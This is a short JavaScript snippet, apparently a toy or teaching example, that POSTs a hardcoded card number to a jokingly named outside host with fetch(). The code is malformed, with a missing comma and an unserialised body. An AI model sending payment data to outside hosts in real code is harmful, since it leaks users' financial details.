const credit_card = "4444 2222 7898 4567"



fetch("http://www.totally_safe_place_to_send_cc_number.com/payment",{
  method: "POST"
  body: {
    credit_card
  }
})